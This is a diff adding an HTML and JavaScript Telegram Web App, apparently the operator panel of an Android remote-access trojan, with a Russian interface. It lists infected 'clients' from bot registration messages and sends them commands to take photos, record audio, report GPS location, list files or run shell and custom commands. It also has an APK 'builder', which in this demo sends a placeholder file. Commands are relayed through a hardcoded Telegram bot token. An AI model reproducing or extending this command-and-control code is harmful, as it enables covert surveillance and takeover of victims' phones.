@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>RAT CONTROL</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0e17;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', sans-serif;
+            padding: 12px;
+            min-height: 100vh;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 16px;
+            background: #141b2b;
+            border-radius: 12px;
+            border: 1px solid #1e2a3a;
+            margin-bottom: 12px;
+        }
+        .header h1 { color: #00d4ff; font-size: 20px; }
+        .header span { color: #556688; font-size: 13px; }
+        .section {
+            background: #141b2b;
+            border-radius: 12px;
+            padding: 12px;
+            border: 1px solid #1e2a3a;
+            margin-bottom: 12px;
+        }
+        .section h3 { color: #00d4ff; font-size: 14px; margin-bottom: 8px; }
+        .btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin: 4px;
+        }
+        .btn-primary { background: #00d4ff; color: #0a0e17; font-weight: bold; }
+        .btn-danger { background: #ff4466; color: #fff; }
+        .btn-success { background: #00ff88; color: #0a0e17; font-weight: bold; }
+        .btn-warning { background: #ffaa00; color: #0a0e17; font-weight: bold; }
+        .btn:hover { opacity: 0.8; transform: scale(0.98); }
+        .cmd-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 6px;
+        }
+        .cmd-btn {
+            padding: 8px;
+            background: #1e2a3a;
+            border: 1px solid #2a3a4a;
+            border-radius: 6px;
+            color: #e0e0e0;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.2s;
+        }
+        .cmd-btn:hover { border-color: #00d4ff; color: #00d4ff; }
+        .custom-cmd {
+            display: flex;
+            gap: 6px;
+            margin-top: 8px;
+        }
+        .custom-cmd input {
+            flex: 1;
+            padding: 8px 12px;
+            background: #0a0e17;
+            border: 1px solid #1e2a3a;
+            border-radius: 6px;
+            color: #e0e0e0;
+            font-size: 13px;
+        }
+        .custom-cmd input:focus { outline: none; border-color: #00d4ff; }
+        .custom-cmd button {
+            padding: 8px 16px;
+            background: #00d4ff;
+            border: none;
+            border-radius: 6px;
+            color: #0a0e17;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .clients-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            padding: 8px;
+            min-height: 40px;
+        }
+        .client-chip {
+            background: #1e2a3a;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            border: 1px solid transparent;
+            transition: all 0.2s;
+        }
+        .client-chip:hover { border-color: #00d4ff; }
+        .client-chip .dot.online { width: 8px; height: 8px; border-radius: 50%; background: #00ff88; display: inline-block; }
+        .client-chip .dot.offline { width: 8px; height: 8px; border-radius: 50%; background: #ff4466; display: inline-block; }
+        .client-chip.selected { border: 1px solid #00d4ff; background: #1a2a3a; }
+        .log-container {
+            background: #0a0e17;
+            border-radius: 6px;
+            padding: 8px;
+            max-height: 120px;
+            overflow-y: auto;
+            font-size: 11px;
+            font-family: monospace;
+            border: 1px solid #1e2a3a;
+        }
+        .log-entry { padding: 2px 0; border-bottom: 1px solid #141b2b; color: #8899bb; }
+        .log-entry .cmd { color: #00d4ff; }
+        .log-entry .result { color: #00ff88; }
+        .log-entry .error { color: #ff4466; }
+        .build-section {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .build-row {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .build-row input {
+            flex: 1;
+            padding: 8px 12px;
+            background: #0a0e17;
+            border: 1px solid #1e2a3a;
+            border-radius: 6px;
+            color: #e0e0e0;
+            min-width: 100px;
+            font-size: 13px;
+        }
+        .build-row input:focus { outline: none; border-color: #00d4ff; }
+        .build-row select {
+            padding: 8px 12px;
+            background: #0a0e17;
+            border: 1px solid #1e2a3a;
+            border-radius: 6px;
+            color: #e0e0e0;
+            min-width: 120px;
+        }
+        .build-row select:focus { outline: none; border-color: #00d4ff; }
+        .build-actions {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .build-actions .btn { flex: 1; min-width: 120px; text-align: center; }
+        @media (max-width: 500px) {
+            .cmd-grid { grid-template-columns: repeat(2, 1fr); }
+            .build-row { flex-direction: column; }
+            .build-actions .btn { flex: 1; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1>📡 RAT CONTROL</h1>
+        <span id="clientCount">0 клиентов</span>
+    </div>
+
+    <!-- БИЛДЕР -->
+    <div class="section">
+        <h3>⚡ Билдер</h3>
+        <div class="build-section">
+            <div class="build-row">
+                <input type="text" id="buildName" placeholder="Имя APK файла..." value="MyRAT">
+                <select id="buildCommand">
+                    <option value="camera">📷 Фото</option>
+                    <option value="mic">🎙️ Аудио</option>
+                    <option value="gps">📍 GPS</option>
+                    <option value="volume 50">🔊 Громкость 50%</option>
+                    <option value="files">📂 Файлы</option>
+                    <option value="ping">🏓 Ping</option>
+                    <option value="shell">💻 Shell</option>
+                </select>
+            </div>
+            <div class="build-actions">
+                <button class="btn btn-primary" onclick="buildAndSend()">📦 Собрать APK</button>
+                <button class="btn btn-success" onclick="buildAndSend('all')">📦 Собрать для всех</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- КЛИЕНТЫ -->
+    <div class="section">
+        <h3>📱 Клиенты (нажми для выбора)</h3>
+        <div id="clientsList" class="clients-list">
+            <span style="color:#556688;font-size:13px;">Ожидание...</span>
+        </div>
+    </div>
+
+    <!-- КОМАНДЫ -->
+    <div class="section">
+        <h3>📋 Команды</h3>
+        <div class="cmd-grid">
+            <button class="cmd-btn" onclick="sendCmd('camera')">📷 Фото</button>
+            <button class="cmd-btn" onclick="sendCmd('mic')">🎙️ Аудио</button>
+            <button class="cmd-btn" onclick="sendCmd('gps')">📍 GPS</button>
+            <button class="cmd-btn" onclick="sendCmd('volume 50')">🔊 Громкость</button>
+            <button class="cmd-btn" onclick="sendCmd('files')">📂 Файлы</button>
+            <button class="cmd-btn" onclick="sendCmd('ping')">🏓 Ping</button>
+        </div>
+        <div class="custom-cmd">
+            <input type="text" id="customCmd" placeholder="Своя команда..." onkeydown="if(event.key==='Enter') sendCustom()">
+            <button onclick="sendCustom()">▶️</button>
+        </div>
+    </div>
+
+    <!-- ЛОГ -->
+    <div class="section">
+        <h3>📝 Лог</h3>
+        <div class="log-container" id="logContainer">
+            <div class="log-entry">[Система] Панель загружена</div>
+        </div>
+    </div>
+</div>
+
+<script>
+// ==========================================
+// КОНФИГ
+// ==========================================
+const BOT_TOKEN = "8740297103:AAGtEIQWroecRaVsgmQcGMKkfK3UABAAJW8";
+const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+let selectedClient = null;
+let clients = [];
+
+// ==========================================
+// TELEGRAM WEB APP
+// ==========================================
+if (window.Telegram && window.Telegram.WebApp) {
+    window.Telegram.WebApp.expand();
+}
+
+// ==========================================
+// ЛОГ
+// ==========================================
+function log(msg, type = '') {
+    const c = document.getElementById('logContainer');
+    const e = document.createElement('div');
+    e.className = 'log-entry';
+    e.innerHTML = `<span>[${new Date().toLocaleTimeString()}]</span> <span class="${type}">${msg}</span>`;
+    c.appendChild(e);
+    c.scrollTop = c.scrollHeight;
+    if (c.children.length > 30) c.removeChild(c.firstChild);
+}
+
+// ==========================================
+// ВЫБОР КЛИЕНТА
+// ==========================================
+function selectClient(id) {
+    selectedClient = id;
+    document.querySelectorAll('.client-chip').forEach(el => el.classList.remove('selected'));
+    document.querySelectorAll('.client-chip').forEach(el => {
+        if (el.dataset.id === id) el.classList.add('selected');
+    });
+    log(`✅ Выбран клиент: ${id.substring(0,8)}...`, 'result');
+}
+
+// ==========================================
+// ОТПРАВКА КОМАНДЫ
+// ==========================================
+async function sendCmd(command) {
+    if (!selectedClient) {
+        log('❌ Сначала выбери клиента!', 'error');
+        return;
+    }
+    log(`📨 ${command} -> ${selectedClient.substring(0,8)}...`, 'cmd');
+    try {
+        await fetch(`${API}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: "-1",
+                text: `${selectedClient}:${command}`
+            })
+        });
+        log(`✅ Отправлено`, 'result');
+    } catch(e) {
+        log(`❌ Ошибка: ${e.message}`, 'error');
+    }
+}
+
+function sendCustom() {
+    const input = document.getElementById('customCmd');
+    const cmd = input.value.trim();
+    if (!cmd) return;
+    sendCmd(cmd);
+    input.value = '';
+}
+
+// ==========================================
+// БИЛДЕР
+// ==========================================
+async function buildAndSend(target = 'selected') {
+    const apkName = document.getElementById('buildName').value.trim() || 'MyRAT';
+    const command = document.getElementById('buildCommand').value;
+    const clientId = target === 'all' ? 'all' : (selectedClient || 'all');
+    
+    log(`📦 Сборка APK "${apkName}" для ${clientId} с командой: ${command}`, 'cmd');
+    
+    try {
+        // Создаём билд
+        const buildData = {
+            name: apkName,
+            command: command,
+            client: clientId,
+            timestamp: Date.now()
+        };
+        
+        // Отправляем уведомление
+        await fetch(`${API}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: "-1",
+                text: `📦 <b>НОВЫЙ БИЛД</b>\n📱 Имя: ${apkName}.apk\n⚡ Команда: ${command}\n👤 Клиент: ${clientId === 'all' ? 'ВСЕ' : clientId.substring(0,8)+'...'}\n⏱️ ${new Date().toLocaleString()}`,
+                parse_mode: "HTML"
+            })
+        });
+        
+        // Отправляем "APK" (в демо — текстовый файл)
+        const fileContent = `# БИЛД RAT\nИмя: ${apkName}.apk\nКоманда: ${command}\nКлиент: ${clientId}\nДата: ${new Date().toISOString()}\n\nЭто демо-версия билда. В реальном проекте здесь был бы APK файл.`;
+        const blob = new Blob([fileContent], { type: 'application/octet-stream' });
+        const formData = new FormData();
+        formData.append('chat_id', '-1');
+        formData.append('document', blob, `${apkName}.apk`);
+        formData.append('caption', `📦 <b>${apkName}.apk</b>\n⚡ Команда: ${command}\n👤 Клиент: ${clientId === 'all' ? 'ВСЕ' : clientId.substring(0,8)+'...'}\n\n<i>Нажми на файл, чтобы скачать</i>`);
+        formData.append('parse_mode', 'HTML');
+        
+        await fetch(`${API}/sendDocument`, {
+            method: 'POST',
+            body: formData
+        });
+        
+        log(`✅ APK "${apkName}" отправлен в Telegram!`, 'result');
+    } catch(e) {
+        log(`❌ Ошибка билда: ${e.message}`, 'error');
+    }
+}
+
+// ==========================================
+// ПОЛУЧЕНИЕ КЛИЕНТОВ
+// ==========================================
+async function getClients() {
+    try {
+        const resp = await fetch(`${API}/getUpdates?offset=-1`);
+        const data = await resp.json();
+        
+        if (data.ok && data.result) {
+            const registered = [];
+            for (const update of data.result) {
+                const msg = update.message;
+                if (msg && msg.text && msg.text.startsWith('REGISTER:')) {
+                    const parts = msg.text.split(':');
+                    if (parts.length >= 3) {
+                        registered.push({
+                            id: parts[1],
+                            name: parts[2],
+                            status: 'online'
+                        });
+                    }
+                }
+            }
+            const unique = registered.filter((v, i, a) => a.findIndex(t => t.id === v.id) === i);
+            clients = unique;
+            updateClientsUI(unique);
+        }
+    } catch(e) {
+        // Игнорируем
+    }
+}
+
+function updateClientsUI(clientsData) {
+    const list = document.getElementById('clientsList');
+    if (!clientsData || clientsData.length === 0) {
+        list.innerHTML = '<span style="color:#556688;font-size:13px;">👻 Нет клиентов</span>';
+        document.getElementById('clientCount').textContent = '0 клиентов';
+        return;
+    }
+    
+    let html = '';
+    clientsData.forEach(c => {
+        const selected = c.id === selectedClient ? 'selected' : '';
+        html += `<div class="client-chip ${selected}" data-id="${c.id}" onclick="selectClient('${c.id}')">
+            <span class="dot ${c.status}"></span> ${c.name}
+        </div>`;
+    });
+    list.innerHTML = html;
+    document.getElementById('clientCount').textContent = `${clientsData.length} клиентов`;
+}
+
+// ==========================================
+// ИНИЦИАЛИЗАЦИЯф
+// ==========================================
+log('🚀 Панель загружена', 'result');
+log('💡 Выбери клиента или собери APK', 'cmd');
+
+getClients();
+setInterval(getClients, 5000);
+</script>
+</body>
+</html>
